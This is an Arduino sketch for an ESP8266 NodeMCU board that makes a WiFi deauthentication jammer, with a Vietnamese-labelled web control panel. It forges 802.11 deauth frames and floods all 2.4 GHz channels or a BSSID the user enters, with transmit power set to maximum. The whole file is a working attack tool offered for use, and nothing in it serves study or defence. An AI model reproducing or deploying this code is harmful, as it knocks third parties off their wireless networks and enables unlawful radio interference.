// zenitdev_jammer_maxpower.ino
// NodeMCU U3 - Phá sóng mạnh tối đa
// Board: Generic ESP8266 Module, 115200, 80MHz

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <user_interface.h>

#define WIFI_SSID "ZenitDev_Control"
#define WIFI_PASS "12345678"
#define WEB_PORT 80

struct {
    bool jamming;
    uint32_t deauth_count;
    uint8_t target_bssid[6];
    char last_action[64];
} state = {false, 0, {0,0,0,0,0,0}, "Chờ"};

ESP8266WebServer server(WEB_PORT);

// ============ TX POWER TỐI ĐA ============
void set_max_power() {
    // *Tất cả công suất vào radio*
    wifi_set_tx_power(82.0); // 82 = 20.5 dBm max
}

// ============ DEAUTH FRAME ============
void send_deauth_burst(uint8_t channel, uint8_t *bssid, uint8_t *client) {
    wifi_set_channel(channel);
    delayMicroseconds(100);
    
    uint8_t packet[26];
    packet[0] = 0xc0;
    packet[1] = 0x00;
    packet[2] = 0x3a;
    packet[3] = 0x01;
    
    memcpy(packet + 4, client, 6);
    memcpy(packet + 10, bssid, 6);
    memcpy(packet + 16, bssid, 6);
    packet[22] = 0x00;
    packet[23] = 0x00;
    packet[24] = 0x04;
    packet[25] = 0x00;
    
    // Gửi burst - nhiều frame nhanh
    for (int i = 0; i < 10; i++) {
        wifi_send_pkt_freedom(packet, 26, 0);
        delayMicroseconds(200);
    }
}

// ============ JAM BROADCAST - TẤT CẢ KÊNH ============
void jam_all_channels_heavy() {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t spoof[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    
    // Kênh 1-13 (2.4GHz full spectrum)
    for (uint8_t ch = 1; ch <= 13; ch++) {
        wifi_set_channel(ch);
        delayMicroseconds(50);
        
        // 200 frame mỗi kênh = 2600 frame total
        for (int i = 0; i < 200; i++) {
            send_deauth_burst(ch, spoof, broadcast);
            state.deauth_count++;
            delayMicroseconds(100);
            yield();
        }
    }
}

// ============ JAM TARGETED - MỤC TIÊU ============
void jam_target_heavy(uint8_t channel, uint8_t *bssid) {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    wifi_set_channel(channel);
    
    // 500 frame mục tiêu - liên tục không ngừng
    for (int i = 0; i < 500; i++) {
        send_deauth_burst(channel, bssid, broadcast);
        state.deauth_count++;
        delayMicroseconds(50);
        yield();
    }
}

// ============ SCAN ============
void scan_networks() {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true);
}

// ============ WEB UI ============
void handle_root() {
    String html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Zenitdev - Phá Sóng Mạnh</title>
    <style>
        body {
            font-family: monospace;
            background: linear-gradient(135deg, #0a0e27 0%, #16213e 100%);
            color: #00ff41;
            padding: 20px;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header {
            text-align: center;
            border-bottom: 2px solid #ff4444;
            padding-bottom: 15px;
            margin-bottom: 30px;
        }
        .header h1 { font-size: 28px; color: #ff4444; text-shadow: 0 0 10px #ff4444; }
        .header p { color: #ffff00; }
        .panel {
            background: rgba(26, 31, 58, 0.9);
            border: 2px solid #ff4444;
            border-radius: 5px;
            padding: 20px;
            margin: 15px 0;
            box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
        }
        .panel h2 {
            color: #ff4444;
            margin-bottom: 15px;
            text-transform: uppercase;
            border-bottom: 2px solid #ff4444;
            padding-bottom: 8px;
        }
        .form-group { margin: 12px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select {
            background: rgba(10, 14, 39, 0.95);
            color: #00ff41;
            border: 2px solid #ff4444;
            padding: 10px;
            border-radius: 3px;
            font-family: monospace;
            width: 100%;
            max-width: 400px;
        }
        .btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 12px 30px;
            margin: 5px 5px 5px 0;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
            transition: all 0.3s;
        }
        .btn:hover { background: #ff0000; box-shadow: 0 0 20px #ff4444; }
        .btn:active { transform: scale(0.95); }
        .status-box {
            background: rgba(255, 68, 68, 0.1);
            border-left: 4px solid #ff4444;
            padding: 15px;
            margin: 15px 0;
            border-radius: 3px;
        }
        .status-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px dotted #ff4444;
        }
        .status-label { color: #ff4444; }
        .status-value { color: #ffff00; font-weight: bold; font-size: 14px; }
        .network-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
            margin-top: 10px;
        }
        .network-table th {
            background: rgba(255, 68, 68, 0.2);
            color: #ff4444;
            padding: 8px;
            border-bottom: 2px solid #ff4444;
        }
        .network-table td {
            padding: 8px;
            border-bottom: 1px solid #ff4444;
        }
        .network-table tr:hover { background: rgba(255, 68, 68, 0.1); }
        .warning {
            background: rgba(255, 68, 68, 0.2);
            border: 2px solid #ff4444;
            color: #ffff00;
            padding: 10px;
            border-radius: 3px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡⚡⚡ ZENITDEV MAXPOWER ⚡⚡⚡</h1>
            <p>Phá sóng WiFi 2.4GHz - Tối ưu NodeMCU U3</p>
            <p>Make by NVH - No Antenna Edition</p>
        </div>
        
        <div class="warning">
            ⚠️ MODE PHÁT MAX: TX Power 82 dBm + Burst 10x Frame
        </div>
        
        <!-- SCAN -->
        <div class="panel">
            <h2>🔍 Quét Mạng</h2>
            <button class="btn" onclick="scan_networks()">QUÉT NGAY</button>
            <div id="scan_result"></div>
        </div>
        
        <!-- BROADCAST -->
        <div class="panel">
            <h2>💥 Phá Toàn Bộ (Tất Cả Kênh)</h2>
            <p style="color: #ffff00; margin: 10px 0;">Jam kênh 1-13 liên tục, 200 frame/kênh</p>
            <button class="btn" onclick="jam_broadcast()">BẮT ĐẦU PHÁT FULL</button>
            <button class="btn" onclick="stop_jam()" style="background: #444;">DỪNG</button>
            <div class="status-box" id="bcast_status">
                <div class="status-item">
                    <span class="status-label">Trạng thái:</span>
                    <span class="status-value">Chờ</span>
                </div>
            </div>
        </div>
        
        <!-- TARGETED -->
        <div class="panel">
            <h2>🎯 Phá Mục Tiêu (500 Frame)</h2>
            <div class="form-group">
                <label>BSSID:</label>
                <input type="text" id="target_bssid" placeholder="AA:BB:CC:DD:EE:FF">
            </div>
            <div class="form-group">
                <label>Kênh:</label>
                <select id="target_channel">
                    <option value="1">1</option><option value="6" selected>6</option><option value="11">11</option>
                </select>
            </div>
            <button class="btn" onclick="jam_target()">PHÁT MỤC TIÊU</button>
            <button class="btn" onclick="stop_jam()" style="background: #444;">DỪNG</button>
            <div class="status-box" id="target_status">
                <div class="status-item">
                    <span class="status-label">Trạng thái:</span>
                    <span class="status-value">Chờ</span>
                </div>
            </div>
        </div>
        
        <!-- STATUS -->
        <div class="panel">
            <h2>📊 Thống Kê</h2>
            <div class="status-box">
                <div class="status-item">
                    <span class="status-label">Frame Deauth Đã Gửi:</span>
                    <span class="status-value" id="deauth_count">0</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Hành Động Cuối:</span>
                    <span class="status-value" id="last_action">Không có</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Trạng Thái:</span>
                    <span class="status-value" id="jam_status">Idle</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function scan_networks() {
            document.getElementById('scan_result').innerHTML = '<p style="color: #00ff41;">⏳ Quét...</p>';
            fetch('/api/scan').then(r => r.json()).then(data => {
                let html = '<h3>✓ Tìm ' + data.networks.length + ' mạng:</h3>';
                html += '<table class="network-table"><tr><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Tín Hiệu</th></tr>';
                data.networks.forEach(net => {
                    html += '<tr><td>' + net.ssid + '</td><td style="font-size:11px;">' + net.bssid + '</td><td>' + net.channel + '</td><td>' + net.rssi + '</td></tr>';
                });
                html += '</table>';
                document.getElementById('scan_result').innerHTML = html;
            });
        }
        
        function jam_broadcast() {
            document.getElementById('bcast_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">⚡ PHÁT FULL POWER...</span></div>';
            fetch('/api/jam_broadcast').then(r => r.json()).then(data => {
                document.getElementById('bcast_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">✓ HOÀN THÀNH (2600 Frame)</span></div>';
                document.getElementById('deauth_count').textContent = data.deauth_count;
                document.getElementById('last_action').textContent = 'Phá Broadcast - Tất Cả Kênh';
            });
        }
        
        function jam_target() {
            let bssid = document.getElementById('target_bssid').value;
            if (!bssid) { alert('Nhập BSSID'); return; }
            
            let ch = document.getElementById('target_channel').value;
            document.getElementById('target_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">⚡ PHÁT MỤC TIÊU...</span></div>';
            
            fetch('/api/jam_target?bssid=' + encodeURIComponent(bssid) + '&channel=' + ch).then(r => r.json()).then(data => {
                document.getElementById('target_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">✓ HOÀN THÀNH (500 Frame)</span></div>';
                document.getElementById('deauth_count').textContent = data.deauth_count;
                document.getElementById('last_action').textContent = 'Phá Mục Tiêu: ' + bssid;
            });
        }
        
        function stop_jam() {
            fetch('/api/stop').then(r => r.json()).then(data => {
                document.getElementById('bcast_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">⏹️ DỪNG</span></div>';
                document.getElementById('target_status').innerHTML = '<div class="status-item"><span class="status-label">Trạng thái:</span><span class="status-value">⏹️ DỪNG</span></div>';
            });
        }
        
        setInterval(() => {
            fetch('/api/status').then(r => r.json()).then(data => {
                document.getElementById('deauth_count').textContent = data.deauth_count;
            }).catch(e => {});
        }, 500);
    </script>
</body>
</html>
)";
    server.send(200, "text/html", html);
}

void handle_api_scan() {
    scan_networks();
    delay(3000);
    
    String json = "{\"networks\":[";
    int n = WiFi.scanComplete();
    if (n == -1) n = 0;
    
    for (int i = 0; i < n && i < 30; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        json += "{\"ssid\":\"" + ssid + "\",\"bssid\":\"" + bssid + "\",\"channel\":" + channel + ",\"rssi\":" + rssi + "}";
        if (i < n-1) json += ",";
    }
    
    json += "]}";
    server.send(200, "application/json", json);
}

void handle_api_jam_broadcast() {
    state.jamming = true;
    jam_all_channels_heavy();
    state.jamming = false;
    strcpy(state.last_action, "Phá Broadcast");
    
    String response = "{\"status\":\"Hoàn\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_jam_target() {
    String bssid_str = server.arg("bssid");
    uint8_t ch = server.arg("channel").toInt();
    
    uint8_t bssid[6];
    sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
        &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    state.jamming = true;
    jam_target_heavy(ch, bssid);
    state.jamming = false;
    strcpy(state.last_action, "Phá Mục Tiêu");
    
    String response = "{\"status\":\"Hoàn\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_stop() {
    state.jamming = false;
    String response = "{\"status\":\"Stop\",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

void handle_api_status() {
    String response = "{\"jamming\":" + String(state.jamming ? "true" : "false") + ",\"deauth_count\":" + String(state.deauth_count) + "}";
    server.send(200, "application/json", response);
}

// ============ SETUP ============
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n[ZENITDEV MAXPOWER] Init");
    
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    set_max_power();
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(WIFI_SSID, WIFI_PASS);
    
    IPAddress local_ip(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    
    Serial.println("[ZENITDEV] AP Ready");
    Serial.print("[ZENITDEV] SSID: ");
    Serial.println(WIFI_SSID);
    
    server.on("/", handle_root);
    server.on("/api/scan", handle_api_scan);
    server.on("/api/jam_broadcast", handle_api_jam_broadcast);
    server.on("/api/jam_target", handle_api_jam_target);
    server.on("/api/stop", handle_api_stop);
    server.on("/api/status", handle_api_status);
    
    server.begin();
    Serial.println("[ZENITDEV] Web live - 192.168.4.1");
}

void loop() {
    server.handleClient();
    delay(5);
}
